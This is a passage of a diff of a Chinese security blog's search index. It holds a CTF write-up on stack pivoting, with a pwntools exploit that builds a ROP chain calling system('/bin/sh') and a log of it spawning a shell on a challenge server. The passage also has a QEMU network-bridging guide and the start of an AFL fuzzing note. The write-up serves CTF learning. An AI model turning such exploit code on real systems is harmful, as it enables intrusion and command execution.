ca fe ff ff          call   400630 &lt;memcpy@plt&gt;</span><br><span class="line">  400779:       e8 92 fe ff ff          call   400610 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">  4007a8:       e8 43 fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007bc:       e8 2f fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007d0:       e8 1b fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007dc:       e8 ff fd ff ff          call   4005e0 &lt;puts@plt&gt;</span><br><span class="line">  4007f7:       e8 14 fe ff ff          call   400610 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">  400803:       e8 d8 fd ff ff          call   4005e0 &lt;puts@plt&gt;</span><br><span class="line">  40081c:       e8 ff fd ff ff          call   400620 &lt;<span class="built_in">read</span>@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>构造出payload = p64(0xdeadbeef) + p64(rdi_ret_addr) + p64(sh_addr) + p64(system_addr) + ‘a’*16 + p64(buf_addr)</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#r = remote(&quot;47.94.239.235&quot;, 2024)</span></span><br><span class="line">    r = process(<span class="string">&quot;./stack4&quot;</span>)</span><br><span class="line">    rdi_ret_addr = <span class="number">0x4008a3</span></span><br><span class="line">    sh_addr = <span class="number">0x4008c9</span></span><br><span class="line">    system_addr = <span class="number">0x40073a</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    buf_addr = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    buf_addr = <span class="built_in">int</span>(buf_addr[-<span class="number">15</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    payload = p64(<span class="number">0xdeadbeef</span>) + p64(rdi_ret_addr) + p64(sh_addr) + p64(system_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span> + p64(buf_addr)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>打通！</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">🍎 ~/kali/ python exp.py</span><br><span class="line">[+] Opening connection to 47.94.239.235 on port 2024: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello ﾭ?</span><br><span class="line">$         whoami</span><br><span class="line">ctf</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cat home/ctf/flag</span><br><span class="line">flag&#123;a32fd27e21-d663-41c0-be6c-9cbb2d504823&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <tags>
@@ -1533,6 +1524,50 @@
       </tags>
   </entry>
   <entry>
+    <title>ROP-花式栈溢出stack_pivoting</title>
+    <url>/2021/11/29/ROP-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BAstack-pivoting/</url>
+    <content><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="stack4">题目</a></p>
+<p>查看保护</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># checksec stack4 </span></span><br><span class="line">[*] <span class="string">&#x27;/home/stack_pivoting/stack4&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>程序会故意泄露buf的首地址（暂且不知道有啥用）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to stack4&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift: %p\n&quot;</span>, &amp;buf, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your name plz&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  print_name(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>print_name函数内部发生栈溢出，然而只是溢出了2个字节，不足以覆到返回地址</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, a1, <span class="number">0x32</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是，因为main和print_name函数的栈帧差距较小，因此溢出的2个字节完全可以覆盖成泄露的buf的地址，从而改变了main函数的rbp，调用print_name函数快结束时，leave等同于mov rsp, rbp；pop rbp，此时rbp就是buf的首地址，然后retn等同于pop rip，回到main刚刚调用完print_name的地方，后面就是main函数的结束恢复帧栈空间了，同理，后面的leave会先把rsp赋值为rbp，这样rsp指向的就是buf了，然后再去pop ebp和ret操作就去执行了我们再buf中构造好的ROP chain啦！</p>
+<p>未覆盖时的栈帧结构</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high address      </span><br><span class="line">                        +--------------------+ &lt;--+ </span><br><span class="line">               +------&gt; |    previous rbp    |    |</span><br><span class="line">               |        +--------------------+    |</span><br><span class="line">               |        |       ......       |    |</span><br><span class="line">               |        +--------------------+    | main()</span><br><span class="line">               |        |        buf         |    |</span><br><span class="line">               |        +--------------------+    |</span><br><span class="line">               |        |   return address   |    |</span><br><span class="line">               |        +--------------------+ &lt;--+</span><br><span class="line">               +------- |    previous rbp    |    |</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |       ......       |    | print_name()</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |        dest        |    |</span><br><span class="line">                        +--------------------+ &lt;--+</span><br><span class="line">low address       </span><br></pre></td></tr></table></figure>
+
+<p>覆盖后的栈帧结构</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high address      </span><br><span class="line">                        +--------------------+      </span><br><span class="line">                        |    previous rbp    |     </span><br><span class="line">                        +--------------------+     </span><br><span class="line">                        |       ......       |     </span><br><span class="line">                        +--------------------+     </span><br><span class="line">                        |      ROP chain     |     </span><br><span class="line">                        +--------------------+ &lt;--+     </span><br><span class="line">               +------&gt; |        buf         |    |</span><br><span class="line">               |        +--------------------+    | main()</span><br><span class="line">               |        |   return address   |    |</span><br><span class="line">               |        +--------------------+ &lt;--+</span><br><span class="line">               +------- |    previous rbp    |    |</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |       ......       |    | print_name()</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |        dest        |    |</span><br><span class="line">                        +--------------------+ &lt;--+</span><br><span class="line">low address       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>因为是64位程序，传参是通过寄存器，所以得先<code>ROPgadget --binary stack4 --only &quot;pop|ret&quot; | grep rdi</code>获取到寄存器保存参数和ret的地址为0x4008a3</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary stack4 --only &quot;pop|ret&quot; | grep rdi</span></span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>获取”/bin/sh”的地址为0x4008c9，<code>ROPgadget --binary stack4 --string &quot;/bin/sh&quot;</code></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary stack4 --string &quot;/bin/sh&quot;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004008c9 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>获取system的地址为0x40073a，<code>objdump -d stack4 | grep &#39;plt&#39;</code></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># objdump -d stack4 | grep &#x27;plt&#x27;</span></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line">00000000004005d0 &lt;.plt&gt;:</span><br><span class="line">00000000004005e0 &lt;puts@plt&gt;:</span><br><span class="line">  4005eb:       e9 e0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">00000000004005f0 &lt;setbuf@plt&gt;:</span><br><span class="line">  4005fb:       e9 d0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400600 &lt;system@plt&gt;:</span><br><span class="line">  40060b:       e9 c0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400610 &lt;<span class="built_in">printf</span>@plt&gt;:</span><br><span class="line">  40061b:       e9 b0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400620 &lt;<span class="built_in">read</span>@plt&gt;:</span><br><span class="line">  40062b:       e9 a0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400630 &lt;memcpy@plt&gt;:</span><br><span class="line">  40063b:       e9 90 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">  40073a:       e8 c1 fe ff ff          call   400600 &lt;system@plt&gt;</span><br><span class="line">  400761:       e8 ca fe ff ff          call   400630 &lt;memcpy@plt&gt;</span><br><span class="line">  400779:       e8 92 fe ff ff          call   400610 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">  4007a8:       e8 43 fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007bc:       e8 2f fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007d0:       e8 1b fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007dc:       e8 ff fd ff ff          call   4005e0 &lt;puts@plt&gt;</span><br><span class="line">  4007f7:       e8 14 fe ff ff          call   400610 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">  400803:       e8 d8 fd ff ff          call   4005e0 &lt;puts@plt&gt;</span><br><span class="line">  40081c:       e8 ff fd ff ff          call   400620 &lt;<span class="built_in">read</span>@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造出payload = p64(0xdeadbeef) + p64(rdi_ret_addr) + p64(sh_addr) + p64(system_addr) + ‘a’*16 + p64(buf_addr)</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#r = remote(&quot;47.94.239.235&quot;, 2024)</span></span><br><span class="line">    r = process(<span class="string">&quot;./stack4&quot;</span>)</span><br><span class="line">    rdi_ret_addr = <span class="number">0x4008a3</span></span><br><span class="line">    sh_addr = <span class="number">0x4008c9</span></span><br><span class="line">    system_addr = <span class="number">0x40073a</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    buf_addr = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    buf_addr = <span class="built_in">int</span>(buf_addr[-<span class="number">15</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    payload = p64(<span class="number">0xdeadbeef</span>) + p64(rdi_ret_addr) + p64(sh_addr) + p64(system_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span> + p64(buf_addr)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>打通！</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">🍎 ~/kali/ python exp.py</span><br><span class="line">[+] Opening connection to 47.94.239.235 on port 2024: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello ﾭ?</span><br><span class="line">$         whoami</span><br><span class="line">ctf</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cat home/ctf/flag</span><br><span class="line">flag&#123;a32fd27e21-d663-41c0-be6c-9cbb2d504823&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>ROP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ret2shellcode</title>
     <url>/2021/12/08/ret2shellcode/</url>
     <content><![CDATA[<h1 id="sniperoj-pwn100-shellcode-x86-64"><a href="#sniperoj-pwn100-shellcode-x86-64" class="headerlink" title="sniperoj-pwn100-shellcode-x86-64"></a>sniperoj-pwn100-shellcode-x86-64</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="sniperoj-pwn100-shellcode-x86-64">题目sniperoj-pwn100-shellcode-x86-64</a></p>
@@ -1561,55 +1596,6 @@
         <tag>CTF</tag>
         <tag>PWN</tag>
         <tag>ret2shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>qemu桥接的两种姿势(win10&amp;&amp;ubuntu)</title>
-    <url>/2021/10/28/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&amp;&amp;ubuntu)/</url>
-    <content><![CDATA[<h1 id="用qemu桥接最简单粗暴的方法-win10"><a href="#用qemu桥接最简单粗暴的方法-win10" class="headerlink" title="用qemu桥接最简单粗暴的方法-win10"></a>用qemu桥接最简单粗暴的方法-win10</h1><p>首先打开网络适配器康康有没有TAP开头的这样的网卡，如果没有，可以去下个OpenVPN或者直接下这个链接：<a href="http://swupdate.openvpn.org/community/releases/tap-windows-9.21.2.exe">http://swupdate.openvpn.org/community/releases/tap-windows-9.21.2.exe</a></p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/oijFkygG42YNOSH.png" alt="image-20211026205903284"></p>
-<p>安装完后，打开网络连接，需要把网卡默认的名字改为tap0</p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/28wBd4JcPR7vAHZ.png" alt="image-20211026210309498"></p>
-<p>然后选中WLAN和tap0他俩，点击后会断网（正常）</p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/8EjmQpuPIOD9VCo.png" alt="image-20211026210412783"></p>
-<p>此时我们再去启动qemu（最好在桥接后启动，不然桥接前就启动tap0会断掉，最后还得重新启动），此时显示就是”已启用，桥接的“，再右键操作如下图就行了</p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/pYiPhCLWof12uJ9.png" alt="image-20211026205401095"></p>
-<p>在qemu虚拟机中ip设为桥接的同一网段（如果发现一会传输失败了，那么需要去修改qemu里的/etc/network下的interfaces，把ip配置都改为静态的，这样就不会中途断掉了）</p>
-<p><code>if config eth0 192.168.8.132/24</code></p>
-<p>就这么简单，配置完后，ping没问题，ssh也ok，酱我们就成功辽</p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/pgfQKruwA7hi3JE.png" alt="image-20211026205114924"></p>
-<p>用完后断开也贼方便，断掉后就自动恢复了</p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/JYy5M4FmWT8ipj1.png" alt="image-20211026210733229"></p>
-<h1 id="qemu在ubuntu如何桥接"><a href="#qemu在ubuntu如何桥接" class="headerlink" title="qemu在ubuntu如何桥接"></a>qemu在ubuntu如何桥接</h1><p>安装网桥工具：</p>
-<p><code>sudo apt-get install bridge-utils</code></p>
-<p>添加网桥：</p>
-<p><code>sudo brctl addbr Virbr0</code></p>
-<p>设置网桥ip：</p>
-<p><code>sudo ifconfig Virbr0 192.168.153.1/24 up</code></p>
-<p>安装tunctl（如果没有tunctl的，也可以先输入tunctl回车，ubuntu会告诉你用哪条命令让你安装）</p>
-<p><code>sudo apt install uml-utilities</code></p>
-<p>将tap0启动，输入命令后会有一个消息显示的，然后ifconfig发现tap0出现了说明成功</p>
-<p><code>sudo tunctl -t tap0</code></p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/5tuEJxVMdk3bgF9.png" alt="image-20211028151000467"></p>
-<p>为tap0设置ip，这里只要跟我们的宿主机的网桥ip在同一个网段即可（如果只是为了用scp传东西的话）</p>
-<p><code>sudo ifconfig tap0 192.168.153.11/24 up</code></p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/2KrJDsimcBAl1ZE.png" alt="image-20211028151603818"></p>
-<p>将tap0和Virbr0桥接：</p>
-<p><code>sudo brctl addif Virbr0 tap0</code></p>
-<p>最后在qemu里把ip设置成跟Virbr0同一个网段的ip即可ping通了</p>
-<p><code>ifconfig eth0 192.168.153.2/24</code></p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/hIwgAxv25VUSotr.png" alt="image-20211028160313946"></p>
-<p>检测scp也ok</p>
-<p><code>scp test.tar.gz root@192.168.153.2:/root</code></p>
-<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/HpjOKv157ZfqVi3.png" alt="image-20211028161104917"></p>
-]]></content>
-      <categories>
-        <category>工具使用</category>
-      </categories>
-      <tags>
-        <tag>IoT</tag>
-        <tag>踩坑</tag>
-        <tag>qemu</tag>
       </tags>
   </entry>
   <entry>
@@ -1798,6 +1784,55 @@
       </tags>
   </entry>
   <entry>
+    <title>qemu桥接的两种姿势(win10&amp;&amp;ubuntu)</title>
+    <url>/2021/10/28/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&amp;&amp;ubuntu)/</url>
+    <content><![CDATA[<h1 id="用qemu桥接最简单粗暴的方法-win10"><a href="#用qemu桥接最简单粗暴的方法-win10" class="headerlink" title="用qemu桥接最简单粗暴的方法-win10"></a>用qemu桥接最简单粗暴的方法-win10</h1><p>首先打开网络适配器康康有没有TAP开头的这样的网卡，如果没有，可以去下个OpenVPN或者直接下这个链接：<a href="http://swupdate.openvpn.org/community/releases/tap-windows-9.21.2.exe">http://swupdate.openvpn.org/community/releases/tap-windows-9.21.2.exe</a></p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/oijFkygG42YNOSH.png" alt="image-20211026205903284"></p>
+<p>安装完后，打开网络连接，需要把网卡默认的名字改为tap0</p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/28wBd4JcPR7vAHZ.png" alt="image-20211026210309498"></p>
+<p>然后选中WLAN和tap0他俩，点击后会断网（正常）</p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/8EjmQpuPIOD9VCo.png" alt="image-20211026210412783"></p>
+<p>此时我们再去启动qemu（最好在桥接后启动，不然桥接前就启动tap0会断掉，最后还得重新启动），此时显示就是”已启用，桥接的“，再右键操作如下图就行了</p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/pYiPhCLWof12uJ9.png" alt="image-20211026205401095"></p>
+<p>在qemu虚拟机中ip设为桥接的同一网段（如果发现一会传输失败了，那么需要去修改qemu里的/etc/network下的interfaces，把ip配置都改为静态的，这样就不会中途断掉了）</p>
+<p><code>if config eth0 192.168.8.132/24</code></p>
+<p>就这么简单，配置完后，ping没问题，ssh也ok，酱我们就成功辽</p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/pgfQKruwA7hi3JE.png" alt="image-20211026205114924"></p>
+<p>用完后断开也贼方便，断掉后就自动恢复了</p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/JYy5M4FmWT8ipj1.png" alt="image-20211026210733229"></p>
+<h1 id="qemu在ubuntu如何桥接"><a href="#qemu在ubuntu如何桥接" class="headerlink" title="qemu在ubuntu如何桥接"></a>qemu在ubuntu如何桥接</h1><p>安装网桥工具：</p>
+<p><code>sudo apt-get install bridge-utils</code></p>
+<p>添加网桥：</p>
+<p><code>sudo brctl addbr Virbr0</code></p>
+<p>设置网桥ip：</p>
+<p><code>sudo ifconfig Virbr0 192.168.153.1/24 up</code></p>
+<p>安装tunctl（如果没有tunctl的，也可以先输入tunctl回车，ubuntu会告诉你用哪条命令让你安装）</p>
+<p><code>sudo apt install uml-utilities</code></p>
+<p>将tap0启动，输入命令后会有一个消息显示的，然后ifconfig发现tap0出现了说明成功</p>
+<p><code>sudo tunctl -t tap0</code></p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/5tuEJxVMdk3bgF9.png" alt="image-20211028151000467"></p>
+<p>为tap0设置ip，这里只要跟我们的宿主机的网桥ip在同一个网段即可（如果只是为了用scp传东西的话）</p>
+<p><code>sudo ifconfig tap0 192.168.153.11/24 up</code></p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/2KrJDsimcBAl1ZE.png" alt="image-20211028151603818"></p>
+<p>将tap0和Virbr0桥接：</p>
+<p><code>sudo brctl addif Virbr0 tap0</code></p>
+<p>最后在qemu里把ip设置成跟Virbr0同一个网段的ip即可ping通了</p>
+<p><code>ifconfig eth0 192.168.153.2/24</code></p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/hIwgAxv25VUSotr.png" alt="image-20211028160313946"></p>
+<p>检测scp也ok</p>
+<p><code>scp test.tar.gz root@192.168.153.2:/root</code></p>
+<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/HpjOKv157ZfqVi3.png" alt="image-20211028161104917"></p>
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>IoT</tag>
+        <tag>踩坑</tag>
+        <tag>qemu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>x86ASM编写主引导扇区</title>
     <url>/2020/11/24/x86ASM%E7%BC%96%E5%86%99%E4%B8%BB%E5%BC%95%E5%AF%BC%E6%89%87%E5%8C%BA/</url>
     <content><![CDATA[<h1 id="编写主引导扇区程序"><a href="#编写主引导扇区程序" class="headerlink" title="编写主引导扇区程序"></a>编写主引导扇区程序</h1><p>test.asm</p>
@@ -1923,41 +1958,6 @@
       <tags>
         <tag>CVE</tag>
         <tag>IoT</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fuzz学习入门之Fuzzing-OpenEuler-file5.41</title>
-    <url>/2022/03/06/Fuzz%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B9%8BFuzzing-OpenEuler-file5-41/</url>
-    <content><![CDATA[<p>下载AFL</p>
-<p><code>git clone https://github.com/google/AFL.git</code></p>
-<p><strong>Tips：需要将AFL/llvm_mode目录下alf-clang-fast.c中131~134行的代码给去掉，不然编译的时候会报错</strong></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081b92mkj21240u0ti7.jpg" alt="image-20220306154520627"></p>
-<p>在AFL下make生成fuzzer</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081a3npvj21730u0gy1.jpg" alt="image-20220306154652875"></p>
-<p>下载测试的项目：</p>
-<p><code>git clone https://gitee.com/src-openeuler/file.git</code></p>
-<p>把C和C++的编译器改为afl的afl-clang-fast和afl-clang-fast++</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/home/re1own/github/AFL/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=/home/re1own/github/AFL/afl-clang-fast++</span><br></pre></td></tr></table></figure>
-
-<p>指定下安装目录</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=/home/re1own/Project/install/</span><br></pre></td></tr></table></figure>
-
-<p>编译安装</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081c4ux2j21c00u0gs5.jpg" alt="image-20220306151917157"></p>
-<p>编译安装完之后可以发现在之前创建和制定的install目录下有了用AFL插桩生成的目标程序了</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081arcmrj20zk09k3z2.jpg" alt="telegram-cloud-photo-size-5-6131935855611326493-y"></p>
